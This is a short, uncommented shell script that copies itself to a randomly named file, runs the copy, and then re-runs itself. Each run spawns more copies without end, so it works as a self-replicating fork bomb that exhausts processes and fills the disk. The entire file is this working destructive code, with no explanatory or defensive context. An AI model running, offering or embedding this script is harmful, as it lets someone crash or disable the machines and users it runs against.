R=$(($RANDOM%1000000))
cp -r $0 $R.sh
sh $R.sh
$0
